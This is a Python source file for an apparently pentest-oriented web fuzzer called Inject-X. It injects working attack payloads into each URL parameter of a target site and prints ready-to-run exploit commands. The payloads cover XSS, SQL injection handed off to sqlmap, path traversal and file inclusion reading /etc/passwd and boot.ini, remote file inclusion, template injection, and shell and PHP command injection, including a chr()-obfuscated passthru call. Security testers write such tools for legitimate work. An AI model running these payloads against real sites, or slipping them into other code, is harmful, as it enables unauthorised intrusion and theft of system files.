#!/usr/bin/python

from __future__ import print_function
import urllib, urllib2, sys, urlparse, os

OKBLUE='\033[94m'
OKRED='\033[91m'
OKGREEN='\033[92m'
OKORANGE='\033[93m'
COLOR1='\033[95m'
COLOR2='\033[96m'
COLOR3='\033[90m'
RESET='\x1b[0m'

def logo():
    print(OKORANGE + '      ____        _           __ _  __' + RESET)
    print(OKORANGE + '     /  _/___    (_)__  _____/ /| |/ /' + RESET)
    print(OKORANGE + '     / // __ \  / / _ \/ ___/ __/   / ' + RESET)
    print(OKORANGE + '   _/ // / / / / /  __/ /__/ /_/   |  ' + RESET)
    print(OKORANGE + '  /___/_/ /_/_/ /\___/\___/\__/_/|_|  ' + RESET)
    print(OKORANGE + '         /_____/                     ' + RESET)
    print('')
    print(OKBLUE +   '--== Inject-X Fuzzer by 1N3@CrowdShield ==-- ' + RESET)
    print(OKBLUE +   '   --== https://crowdshield.com ==-- ' + RESET)
    print('')


def active_scan():

    # PUT EVERYTHING BACK TOGETHER
    new_url = base_url


    # Open Redirect ######################################################################################
    #redirect_exploit = "hTtP://tests.arachni-scanner.com/rfi.md5.txt"
    redirect_exploit = urllib.quote_plus('hTtP://tests.arachni-scanner.com/rfi.md5.txt')
    # print COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET
    redirect_url = new_url.replace("INJECTX", redirect_exploit)
    http_request = urllib.urlopen(redirect_url)
    http_response = http_request.read()
    http_length = len(http_response)
    http_status = http_request.getcode()
    http_length_diff = str(http_length_base - http_length)
    print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

    if "705cd559b16e6946826207c2199bd890" in http_response:
        print(OKRED + "[+] Open Redirect Found! " + RESET)
        print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
        print(OKGREEN + "[c] Exploit Command: curl -s -I -L '" + redirect_url + "' | egrep location --color=auto")
    else:
        print(COLOR1 + "[F] Open Redirect Failed." + RESET)


    # Open Redirect 2 ######################################################################################
    redirect_exploit = "crowdshield.com"
    # print COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET
    redirect_url = new_url.replace("INJECTX", redirect_exploit)
    http_request = urllib.urlopen(redirect_url)
    http_response = http_request.read()
    http_length = len(http_response)
    http_status = http_request.getcode()
    http_length_diff = str(http_length_base - http_length)
    print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

    if "www.crowdshield.com" in http_response:
        print(OKRED + "[+] Open Redirect Found! " + RESET)
        print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
        print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
    else:
        print(COLOR1 + "[F] Open Redirect Failed." + RESET)


    # Open Redirect 3 ######################################################################################
    redirect_exploit = urllib.quote_plus("//crowdshield.com")
    # print COLOR2 + "[i] Trying Payload: " + str(redirect_exploit) + RESET
    redirect_url = new_url.replace("INJECTX", redirect_exploit)
    http_request = urllib.urlopen(redirect_url)
    http_response = http_request.read()
    http_length = len(http_response)
    http_status = http_request.getcode()
    http_length_diff = str(http_length_base - http_length)
    print(COLOR2 + "[i] New URL: " + redirect_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

    if "www.crowdshield.com" in http_response:
        print(OKRED + "[+] Open Redirect Found! " + RESET)
        print(OKRED + "[+] Vulnerable URL: " + redirect_url + RESET)
        print(OKGREEN + "[c] Exploit Command: curl -s -I '" + redirect_url + "' | egrep location --color=auto")
    else:
        print(COLOR1 + "[F] Open Redirect Failed." + RESET)


    # XSS ######################################################################################
    try:
        # print COLOR2 + "[i] Trying Payload: " + str(payload) + RESET
        http_request = urllib2.urlopen(new_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_status = http_request.getcode()
        http_length_diff = str(http_length_base - http_length)
        print(COLOR2 + "[i] New URL: " + new_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        # CHECK FOR REFLECTED VALUE
        if payload in http_response:
            print(OKGREEN + "[+] Reflected Value Detected! " + RESET)

            # IF REFLECTED, TRY HEURISTIC STRING
            payload_exploit_unencoded = '"></INJECTX>(1)'
            payload_exploit = urllib.quote_plus('"></INJECTX>(1)')
            xss_url = new_url.replace("INJECTX", payload_exploit)
            # print COLOR2 + "[i] Trying Payload: " + str(payload_exploit) + RESET
            http_request = urllib2.urlopen(xss_url)
            http_response = http_request.read()
            http_length = len(http_response)
            http_length_diff = str(http_length_base - http_length)
            http_status = http_request.getcode()
            print(COLOR2 + "[i] New URL: " + xss_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

            # CONTINUE TO XSS EXPLOITATION
            if payload_exploit_unencoded in http_response:
                payload_exploit2 = urllib.quote_plus('"><iframe/onload=alert(1)>')
                xss_url2 = new_url.replace("INJECTX", payload_exploit2)
                print(OKRED + "[+] XSS Found! ", str(payload_exploit2) + RESET)
                print(OKRED + "[+] Vulnerable URL: " + xss_url2 + RESET)
                print(OKGREEN + "[c] Exploit Command: firefox '" + xss_url2 + "' & ")
                #os.system("curl -s '" + xss_url2 + "' | egrep alert\(1\) --color=auto")
                #os.system("firefox '" + xss_url2 + "' > /dev/null 2> /dev/null")
            else:
                print(COLOR1 + "[F] XSS Exploit Failed." + RESET)

        else:
            print(COLOR1 + "[F] No Reflected Values Found. " + RESET)
    except:
        pass


    # SQLi ######################################################################################
    try:
        sqli_exploit = urllib.quote_plus("'")
        # print COLOR2 + "[i] Trying Payload: " + str(sqli_exploit) + RESET
        sqli_url = new_url.replace("INJECTX", sqli_exploit)
        http_request = urllib.urlopen(sqli_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + sqli_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "SQL" in http_response or http_status == 500 or http_status == 503:
            print(OKRED + "[+] SQL Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + sqli_url + RESET)
            sqlmap_command = 'sqlmap --batch --dbs -u "' + full_url + '"'
            print(OKGREEN + "[c] Exploit Command: " + sqlmap_command)
            #os.system(sqlmap_command)
        else:
            print(COLOR1 + "[F] SQL Injection Failed." + RESET)
    except:
        pass




    # Windows Directory Traversal ######################################################################################
    try:
        traversal_exploit = urllib.quote_plus('..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini')
        # print COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
        traversal_url = new_url.replace("INJECTX", traversal_exploit)
        http_request = urllib.urlopen(traversal_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "boot loader" in http_response:
            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto")
        else:
            print(COLOR1 + "[F] Windows Directory Traversal Failed." + RESET)
    except:
        pass

    # Windows Directory Traversal 2 ######################################################################################
    try:
        traversal_exploit = urllib.quote_plus('..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\\boot.ini%00')
        # print COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
        traversal_url = new_url.replace("INJECTX", traversal_exploit)
        http_request = urllib.urlopen(traversal_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "boot loader" in http_response:
            print(OKRED + "[+] Windows Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep Windows --color=auto")
        else:
            print(COLOR1 + "[F] Windows Directory Traversal + NULL Byte Failed." + RESET)
    except:
        pass

    # Linux Directory Traversal ######################################################################################
    try:
        traversal_exploit = urllib.quote_plus("../../../../../../../../../../../../../../../../../etc/passwd")
        # print COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
        traversal_url = new_url.replace("INJECTX", traversal_exploit)
        http_request = urllib.urlopen(traversal_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto")
        else:
            print(COLOR1 + "[F] Linux Directory Traversal Failed." + RESET)
    except:
        pass

    # Linux Directory Traversal 2 ######################################################################################
    try:
        traversal_exploit = urllib.quote_plus("../../../../../../../../../../../../../../../../../etc/passwd%00")
        # print COLOR2 + "[i] Trying Payload: " + str(traversal_exploit) + RESET
        traversal_url = new_url.replace("INJECTX", traversal_exploit)
        http_request = urllib.urlopen(traversal_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + traversal_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux Directory Traversal Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + traversal_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + traversal_url + "' | egrep root --color=auto")
        else:
            print(COLOR1 + "[F] Linux Directory Traversal + NULL Byte Failed." + RESET)
    except:
        pass



    # LFI Check ######################################################################################
    try:
        rfi_exploit = urllib.quote_plus("/etc/passwd")
        # print COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET
        rfi_url = new_url.replace("INJECTX", rfi_exploit)
        http_request = urllib.urlopen(rfi_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux Local File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto")
        else:
            print(COLOR1 + "[F] Linux Local File Inclusion Failed." + RESET)
    except:
        pass


    # LFI Check 2 ######################################################################################
    try:
        rfi_exploit = urllib.quote_plus("/etc/passwd%00")
        # print COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET
        rfi_url = new_url.replace("INJECTX", rfi_exploit)
        http_request = urllib.urlopen(rfi_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux Local File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto")
        else:
            print(COLOR1 + "[F] Linux Local File Inclusion + NULL Byte Failed." + RESET)
    except:
        pass


    # LFI Check 3 ######################################################################################
    try:
        rfi_exploit = urllib.quote_plus("C:\\boot.ini")
        # print COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET
        rfi_url = new_url.replace("INJECTX", rfi_exploit)
        http_request = urllib.urlopen(rfi_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "boot loader" in http_response:
            print(OKRED + "[+] Windows Local File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto")
        else:
            print(COLOR1 + "[F] Windows Local File Inclusion." + RESET)
    except:
        pass


    # LFI Check 4 ######################################################################################
    try:
        rfi_exploit = urllib.quote_plus("C:\\boot.ini%00")
        # print COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET
        rfi_url = new_url.replace("INJECTX", rfi_exploit)
        http_request = urllib.urlopen(rfi_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "boot loader" in http_response:
            print(OKRED + "[+] Local File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 'root:' --color=auto")
        else:
            print(COLOR1 + "[F] Windows Local File Inclusion + NULL Byte Failed." + RESET)
    except:
        pass


    # RFI Check ######################################################################################
    try:
        rfi_exploit = urllib.quote_plus("hTtP://tests.arachni-scanner.com/rfi.md5.txt")
        # print COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET
        rfi_url = new_url.replace("INJECTX", rfi_exploit)
        http_request = urllib.urlopen(rfi_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "705cd559b16e6946826207c2199bd890" in http_response:
            print(OKRED + "[+] Remote File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 705cd559b16e6946826207c2199bd890 --color=auto")
        else:
            print(COLOR1 + "[F] Remote File Inclusion Failed." + RESET)
    except:
        pass


    # RFI Check 2 ######################################################################################
    try:
        rfi_exploit = urllib.quote_plus("hTtP://tests.arachni-scanner.com/rfi.md5.txt%00")
        # print COLOR2 + "[i] Trying Payload: " + str(rfi_exploit) + RESET
        rfi_url = new_url.replace("INJECTX", rfi_exploit)
        http_request = urllib.urlopen(rfi_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + rfi_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "705cd559b16e6946826207c2199bd890" in http_response:
            print(OKRED + "[+] Remote File Inclusion Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rfi_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rfi_url + "' | egrep 705cd559b16e6946826207c2199bd890 --color=auto")
        else:
            print(COLOR1 + "[F] Remote File Inclusion + NULL Byte Failed." + RESET)
    except:
        pass


    # IDOR Check ######################################################################################
    idor_list = [1,2,3]
    idor_length_list = []
    for idor in idor_list:
        try:
            idor_exploit = str(idor)
            # print COLOR2 + "[i] Trying Payload: " + str(idor) + RESET
            idor_url = new_url.replace("INJECTX", idor_exploit)
            http_request = urllib.urlopen(idor_url)
            http_response = http_request.read()
            http_length = len(http_response)
            http_status = http_request.getcode()
            idor_length_list.append(http_length)
            http_length_diff = str(http_length_base - http_length)
            print(COLOR2 + "[i] New URL: " + idor_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

            if (idor_length_list[0] != idor_length_list[1]) or (idor_length_list[1] != idor_length_list[2]) or (idor_length_list[0] != idor_length_list[2]):
                print(OKRED + "[+] Possible IDOR Found! " + RESET)
                print(OKRED + "[+] Vulnerable URL: " + idor_url + RESET)
                print(OKGREEN + "[c] Exploit Command: curl -s '" + idor_url + "'")
            else:
                print(COLOR1 + "[F] IDOR Failed." + RESET)
        except:
            pass

    # Buffer Overflow Check ######################################################################################
    #try:
    #    overflow_exploit = "INJECTX" * 4000
    #    # print COLOR2 + "[i] Trying Payload: " + "INJECTXINJECTXINJECTXINJECTXINJECTXINJECTX..." + RESET
    #    overflow_url = new_url.replace("INJECTX", overflow_exploit)
    #    http_request = urllib.urlopen(overflow_url)
    #    http_response = http_request.read()
    #    http_length = len(http_response)
    #    http_status = http_request.getcode()
    #    print COLOR2 + "[i] New URL: " + new_url + "INJECTXINJECTXINJECTXINJECTXINJECTXINJECTX..." + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + RESET
    #
    #    if http_status != 200 or http_status != 414 or http_status != 413:
    #        print OKGREEN + "[+] Possible Buffer Overflow Found! " + RESET
    #    else:
    #        print COLOR1 + "[F] Buffer Overflow Failed." + RESET
    #except:
    #    pass
    #

    # SSTI Check ######################################################################################
    try:
        ssti_exploit = urllib.quote_plus("{{1336%2B1}}")
        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
        ssti_url = new_url.replace("INJECTX", ssti_exploit)
        http_request = urllib.urlopen(ssti_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + ssti_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "1337" in http_response:
            print(OKRED + "[+] Server Side Template Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + ssti_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + ssti_url + "' | egrep 1337 --color=auto")
        else:
            print(COLOR1 + "[F] Server Side Template Injection Failed." + RESET)
    except:
        pass



    # SSTI Check 2 ######################################################################################
    try:
        ssti_exploit = urllib.quote_plus("1336+1")
        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
        ssti_url = new_url.replace("INJECTX", ssti_exploit)
        http_request = urllib.urlopen(ssti_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + ssti_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "1337" in http_response:
            print(OKRED + "[+] Server Side Template Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + ssti_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + ssti_url + "' | egrep 1337 --color=auto")
        else:
            print(COLOR1 + "[F] Server Side Template Injection Failed." + RESET)
    except:
        pass




    # RCE Linux Check ######################################################################################
    try:
        rce_exploit = urllib.quote_plus("$(cat+/etc/passwd)")
        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
        rce_url = new_url.replace("INJECTX", rce_exploit)
        http_request = urllib.urlopen(rce_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto")
        else:
            print(COLOR1 + "[F] Linux Command Injection Failed." + RESET)
    except:
        pass


    # RCE Linux Check 2 ######################################################################################
    try:
        rce_exploit = urllib.quote_plus("$(sleep+10)")
        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
        rce_url = new_url.replace("INJECTX", rce_exploit)
        http_request = urllib.urlopen(rce_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux Time Based Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto")
        else:
            print(COLOR1 + "[F] Linux Time Based Command Injection Failed." + RESET)
    except:
        pass





    # RCE PHP Check ######################################################################################
    try:
        rce_exploit = urllib.quote_plus("phpinfo()")
        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
        rce_url = new_url.replace("INJECTX", rce_exploit)
        http_request = urllib.urlopen(rce_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "<title>phpinfo()</title>" in http_response:
            print(OKRED + "[+] Generic PHP Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep PHP --color=auto")
        else:
            print(COLOR1 + "[F] Generic PHP Command Injection Failed." + RESET)
    except:
        pass



    # RCE PHP Check 2 ######################################################################################
    try:
        rce_exploit = urllib.quote_plus('{${passthru(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100))}}{${exit()}}')
        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
        rce_url = new_url.replace("INJECTX", rce_exploit)
        http_request = urllib.urlopen(rce_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] Linux PHP Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto")
        else:
            print(COLOR1 + "[F] Linux PHP Command Injection Failed." + RESET)
    except:
        pass




    # RCE PHP Check 3 ######################################################################################
    try:
        rce_exploit = urllib.quote_plus('{${passthru(chr(115).chr(108).chr(101).chr(101).chr(112).chr(32).chr(49).chr(48))}}{${exit()}}')
        # print COLOR2 + "[i] Trying Payload: " + str(ssti_exploit) + RESET
        rce_url = new_url.replace("INJECTX", rce_exploit)
        http_request = urllib.urlopen(rce_url)
        http_response = http_request.read()
        http_length = len(http_response)
        http_length_diff = str(http_length_base - http_length)
        http_status = http_request.getcode()
        print(COLOR2 + "[i] New URL: " + rce_url + " [" + OKRED + str(http_status) + COLOR2 + COLOR2 + "]" + " [" + COLOR3 + str(http_length) + COLOR2 + "]" + " [" + COLOR1 + http_length_diff + COLOR2 + "]" + RESET)

        if "root:" in http_response:
            print(OKRED + "[+] PHP Command Injection Found! " + RESET)
            print(OKRED + "[+] Vulnerable URL: " + rce_url + RESET)
            print(OKGREEN + "[c] Exploit Command: curl -s '" + rce_url + "' | egrep root: --color=auto")
        else:
            print(COLOR1 + "[F] PHP Command Injection Failed." + RESET)
    except:
        pass


logo()

full_url = sys.argv[1]
payload = "INJECTX"
http_request_base = urllib.urlopen(full_url)
http_response_base = http_request_base.read()
http_length_base = len(http_response_base)
http_status_base = http_request_base.getcode()

print(RESET)
print(COLOR3 + ">>> " + OKORANGE + full_url + COLOR2 + " [" + OKRED + str(http_status_base) + COLOR2 + "]" + " [" + COLOR3 + str(http_length_base) + COLOR2 + "]" + RESET)
print(COLOR3 + "======================================================================================================" + RESET)

if str(http_status_base) == "404":
    print(COLOR1 + "[F] Received HTTP Status 404 - Page Not Found. Skipping..." + RESET)

elif str(http_status_base) == "403":
    print(COLOR1 + "[F] Received HTTP Status 403 - Page Not Found. Skipping..." + RESET)

else:
    if "=" in full_url:
        try:
            parsed = urlparse.urlparse(full_url)
            params = urlparse.parse_qsl(parsed.query)
            param_list = []
            param_vals = []
            param_length = 0
            for x,y in params:
                param_list.extend([str(x + "=")])
                param_vals.extend([str(urllib.quote_plus(y))])
                param_length = param_length + 1

            # FIND BASE URL
            dynamic_url = full_url.find("?")
            base_url = str(full_url[:dynamic_url + 1])

            # LIST EACH PARAMETER
            active_fuzz = 1
            i = 1

            while i <= param_length and active_fuzz <= param_length:
                # DETERMINE FUZZ PARAMETER SELECTED
                # IF CURRENT POSITION IS THE ACTIVE FUZZ POSITION
                #print "i=" + str(i)
                #print "param_length=" + str(param_length)
                #print "active_fuzz=" + str(active_fuzz)
                #print "param_list[i-1]=" + str(param_list[i-1])

                if (i < param_length and i == active_fuzz):
                    #print "Active Fuzz Point Found!"
                    print(OKORANGE + "[D] Fuzzing Parameter: " + param_list[i-1] + RESET)
                    print(OKORANGE + "----------------------------------------------------" + RESET)
                    base_url += param_list[i-1] + payload + "&"
                    i = i+1

                elif (i == param_length and i == active_fuzz):
                    #print i
                    #print param_length
                    #print active_fuzz
                    #print "Last Parameter Is The Active Fuzz Position"
                    print(OKORANGE + "[D] Fuzzing Parameter: " + param_list[i-1] + RESET)
                    print(OKORANGE + "----------------------------------------------------" + RESET)
                    base_url += param_list[i-1] + payload
                    active_fuzz = active_fuzz+1
                    i = i+1
                    #i = 1
                    active_scan()
                    base_url = str(full_url[:dynamic_url + 1])

                elif (i == param_length and i != active_fuzz):
                    #print "Last Parameter Is Not The Active Fuzz Position"
                    base_url += param_list[i-1] + param_vals[i-1]
                    active_fuzz = active_fuzz+1
                    i = 1
                    active_scan()
                    base_url = str(full_url[:dynamic_url + 1])

                elif (i == param_length):
                    #print "Current Parameter Is The Last Position"
                    base_url += param_list[i-1] + param_vals[i-1]
                    active_fuzz = active_fuzz+1
                    i = 1
                    active_scan()
                    base_url = str(full_url[:dynamic_url + 1])
                else:
                    #print "Rebuilding Original Parameter Values"
                    base_url += param_list[i-1] + param_vals[i-1] + "&"
                    i = i+1

                #print "-----------------------"


        except:
            pass
    else:
        print(COLOR2 + "[i] URL does not appear to be dynamic..." + RESET)


print(OKORANGE + "______________________________________________________________________________________________________" + RESET)
print(RESET)
print(RESET)
